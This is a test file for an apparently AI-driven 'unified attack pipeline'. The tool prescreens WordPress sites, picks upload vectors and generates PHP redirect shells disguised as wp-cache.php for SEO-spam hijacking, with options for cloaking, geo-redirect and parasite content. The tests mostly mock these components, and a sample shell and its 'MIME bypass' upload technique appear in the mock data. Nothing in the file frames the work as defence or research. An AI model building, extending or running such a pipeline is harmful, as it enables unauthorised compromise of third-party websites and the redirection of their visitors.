/**
 * Tests for: Unified Attack Pipeline
 * All heavy dependencies are mocked so tests run fast.
 */
import { describe, it, expect, vi, beforeEach } from "vitest";

// Mock fetch globally
const mockFetch = vi.fn();
global.fetch = mockFetch as any;

// Mock the LLM module
vi.mock("./_core/llm", () => ({
  invokeLLM: vi.fn().mockResolvedValue({
    choices: [{
      message: {
        content: JSON.stringify({
          vectors: [],
          analysis: "Mock analysis",
          shell_code: "<?php header('Location: https://redirect.com'); ?>",
          shell_type: "redirect_php",
          bypass_techniques: ["MIME bypass"],
          filename: "wp-cache.php",
        }),
      },
    }],
  }),
}));

// Mock env
vi.mock("./_core/env", () => ({
  ENV: {
    shodanApiKey: "test-key",
    builtInForgeApiUrl: "https://api.test.com",
    builtInForgeApiKey: "test-forge-key",
  },
}));

// Mock one-click-deploy
vi.mock("./one-click-deploy", () => ({
  oneClickDeploy: vi.fn().mockResolvedValue({
    success: false,
    filesDeployed: [],
    errors: ["Mock: no deploy"],
    duration: 100,
  }),
}));

// Mock alt-upload-methods
vi.mock("./alt-upload-methods", () => ({
  tryAllUploadMethods: vi.fn().mockResolvedValue([]),
}));

// Mock enhanced-upload-engine
vi.mock("./enhanced-upload-engine", () => ({
  multiVectorParallelUpload: vi.fn().mockResolvedValue({ success: false, results: [], bestResult: null }),
  smartRetryUpload: vi.fn().mockResolvedValue({ success: false, results: [], bestResult: null }),
}));

// Mock ai-prescreening
vi.mock("./ai-prescreening", () => ({
  preScreenTarget: vi.fn().mockResolvedValue({
    domain: "test.com",
    timestamp: Date.now(),
    serverType: "Apache",
    serverVersion: "2.4",
    cms: "WordPress",
    cmsVersion: "6.0",
    phpVersion: "7.4",
    osGuess: "Linux",
    hostingProvider: null,
    ipAddress: "1.2.3.4",
    reverseIp: [],
    wafDetected: null,
    wafStrength: "none",
    sslInfo: { enabled: true, issuer: null, validUntil: null },
    securityHeaders: {},
    securityScore: 30,
    openPorts: [{ port: 80, service: "http" }],
    ftpAvailable: false,
    sshAvailable: false,
    webdavAvailable: false,
    cmsPlugins: [],
    cmsTheme: null,
    knownVulnerabilities: [],
    writablePaths: ["/wp-content/uploads/"],
    uploadEndpoints: [],
    fileManagerDetected: false,
    xmlrpcAvailable: false,
    restApiAvailable: false,
    directoryListingPaths: [],
    overallSuccessProbability: 40,
    methodProbabilities: [],
    riskLevel: "medium",
    detectionRisk: "medium",
    warnings: [],
    recommendations: [],
    aiAnalysis: null,
    aiRecommendedMethods: [],
    aiEstimatedDifficulty: "medium",
    shouldProceed: true,
    proceedReason: "Moderate chance",
  }),
}));

// Mock ai-vuln-analyzer
vi.mock("./ai-vuln-analyzer", () => ({
  fullVulnScan: vi.fn().mockResolvedValue({
    target: "https://test.com",
    serverInfo: {
      ip: "1.2.3.4",
      server: "Apache/2.4",
      poweredBy: "PHP/7.4",
      os: "linux",
      phpVersion: "7.4",
      headers: {},
      waf: null,
      cdn: null,
      ssl: true,
      httpMethods: ["GET", "POST"],
    },
    cms: {
      type: "wordpress",
      version: "6.0",
      plugins: [],
      themes: [],
      vulnerableComponents: [],
      adminUrl: "",
      loginUrl: "",
      apiEndpoints: [],
    },
    writablePaths: [],
    uploadEndpoints: [],
    exposedPanels: [],
    misconfigurations: [],
    attackVectors: [{
      id: "vec_1",
      name: "Upload Bypass",
      method: "POST",
      targetPath: "/wp-content/uploads/",
      successProbability: 70,
      shellType: "php",
      technique: "MIME bypass",
      payloadType: "php_redirect",
      riskLevel: 3,
      aiReasoning: "WordPress upload",
    }],
    aiAnalysis: "Target vulnerable",
    scanDuration: 500,
    timestamp: Date.now(),
  }),
}));

// Mock ai-shell-generator
vi.mock("./ai-shell-generator", () => ({
  generateShellsForTarget: vi.fn().mockResolvedValue([
    {
      id: "shell_1",
      type: "redirect_php",
      filename: "wp-cache.php",
      content: "<?php header('Location: https://redirect.com'); ?>",
      contentType: "application/x-php",
      description: "PHP redirect shell",
      targetVector: "vec_1",
      bypassTechniques: ["MIME bypass"],
      redirectUrl: "https://redirect.com",
      seoKeywords: ["test"],
      verificationMethod: "http_get",
    },
  ]),
  pickBestShell: vi.fn().mockImplementation((shells: any[]) => shells[0]),
}));

// ═══════════════════════════════════════════════════════
//  Unified Attack Pipeline Tests
// ═══════════════════════════════════════════════════════

describe("Unified Attack Pipeline", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mockFetch.mockReset();
    mockFetch.mockResolvedValue({
      ok: false,
      status: 404,
      statusText: "Not Found",
      headers: new Map([["server", "Apache/2.4"]]),
      text: () => Promise.resolve("Not Found"),
      json: () => Promise.resolve({}),
    });
  });

  it("should export runUnifiedAttackPipeline function", async () => {
    const mod = await import("./unified-attack-pipeline");
    expect(typeof mod.runUnifiedAttackPipeline).toBe("function");
  });

  it("should export PipelineConfig interface", async () => {
    const mod = await import("./unified-attack-pipeline");
    expect(mod).toBeDefined();
  });

  it("should export PipelineResult interface", async () => {
    const mod = await import("./unified-attack-pipeline");
    expect(mod).toBeDefined();
  });

  it("should export PipelineEvent interface", async () => {
    const mod = await import("./unified-attack-pipeline");
    expect(mod).toBeDefined();
  });

  it("should export UploadedFile interface", async () => {
    const mod = await import("./unified-attack-pipeline");
    expect(mod).toBeDefined();
  });

  it("should emit events during pipeline execution", async () => {
    const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");

    const events: Array<{ phase: string; step: string; detail: string; progress: number }> = [];

    const result = await runUnifiedAttackPipeline(
      {
        targetUrl: "https://test-target.com",
        redirectUrl: "https://my-redirect.com",
        seoKeywords: ["test"],
        maxUploadAttempts: 1,
      },
      (event) => {
        events.push(event);
      },
    );

    // Should have emitted events
    expect(events.length).toBeGreaterThan(0);

    // Should have prescreen events
    const prescreenEvents = events.filter(e => e.phase === "prescreen");
    expect(prescreenEvents.length).toBeGreaterThan(0);

    // Result should be a valid PipelineResult
    expect(result).toBeDefined();
    expect(typeof result.success).toBe("boolean");
    expect(typeof result.targetUrl).toBe("string");
    expect(typeof result.redirectUrl).toBe("string");
    expect(typeof result.shellsGenerated).toBe("number");
    expect(typeof result.uploadAttempts).toBe("number");
    expect(Array.isArray(result.uploadedFiles)).toBe(true);
    expect(Array.isArray(result.verifiedFiles)).toBe(true);
    expect(typeof result.totalDuration).toBe("number");
    expect(Array.isArray(result.aiDecisions)).toBe(true);
    expect(Array.isArray(result.errors)).toBe(true);
  }, 30000);

  it("should have correct PipelineConfig structure", async () => {
    const mod = await import("./unified-attack-pipeline");
    expect(typeof mod.runUnifiedAttackPipeline).toBe("function");

    const validConfig = {
      targetUrl: "https://example.com",
      redirectUrl: "https://redirect.com",
      seoKeywords: ["test"],
      cloaking: true,
      geoRedirect: true,
      parasiteContent: "medium" as const,
      maxUploadAttempts: 5,
      timeoutPerMethod: 30000,
    };

    expect(validConfig.targetUrl).toBe("https://example.com");
    expect(validConfig.seoKeywords).toEqual(["test"]);
    expect(validConfig.cloaking).toBe(true);
    expect(validConfig.parasiteContent).toBe("medium");
  });

  it("should track AI decisions during pipeline", async () => {
    const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");

    const result = await runUnifiedAttackPipeline(
      {
        targetUrl: "https://ai-test.com",
        redirectUrl: "https://redirect.com",
        seoKeywords: [],
        maxUploadAttempts: 1,
      },
      () => {},
    );

    // Should have AI decisions logged
    expect(Array.isArray(result.aiDecisions)).toBe(true);
    expect(result.aiDecisions.length).toBeGreaterThan(0);
  }, 30000);

  it("should measure total duration", async () => {
    const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");

    const result = await runUnifiedAttackPipeline(
      {
        targetUrl: "https://duration-test.com",
        redirectUrl: "https://redirect.com",
        seoKeywords: [],
        maxUploadAttempts: 1,
      },
      () => {},
    );

    expect(result.totalDuration).toBeGreaterThanOrEqual(0);
    expect(result.totalDuration).toBeLessThan(120000);
  }, 30000);
});
